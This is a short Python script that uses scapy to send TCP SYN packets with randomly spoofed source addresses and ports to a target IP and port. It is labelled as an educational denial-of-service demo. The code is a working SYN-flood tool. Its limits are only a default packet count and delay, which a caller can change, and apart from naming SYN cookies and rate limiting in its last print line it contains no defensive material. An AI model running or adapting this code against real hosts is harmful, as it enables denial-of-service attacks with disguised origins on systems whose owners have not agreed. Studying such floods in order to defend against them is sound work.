from scapy.all import *
import random
import time

def syn_flood_demo(target_ip, target_port, count=10, delay=0.5):
    """
    LEGAL DEMO: TCP SYN Flood Simulation (for educational purposes only)
    
    Args:
        target_ip (str): Target IP (must be a test server you own)
        target_port (int): Target port (e.g., 80 for HTTP)
        count (int): Number of packets to send (default: 10)
        delay (float): Delay between packets (avoid flooding)
    """
    print(f"[EDUCATIONAL DEMO] Sending {count} SYN packets to {target_ip}:{target_port}")
    
    for i in range(count):
        # Simulate random source IP (for educational purposes)
        src_ip = f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"
        src_port = random.randint(1024, 65535)
        
        # Craft SYN packet
        ip_layer = IP(src=src_ip, dst=target_ip)
        tcp_layer = TCP(sport=src_port, dport=target_port, flags="S")
        packet = ip_layer / tcp_layer
        
        # Send packet (with delay for safety)
        send(packet, verbose=0)
        print(f"Sent SYN packet {i+1}/{count} from {src_ip}:{src_port}")
        time.sleep(delay)  # Prevents real flooding
    
    print("[DEMO ENDED] Use responsibly. Teach defenses like SYN cookies and rate limiting.")

# === LEGAL USAGE EXAMPLE ===
# Only run on authorized systems!
# syn_flood_demo("192.168.1.100", 80, count=10, delay=0.5)  # Test on your own server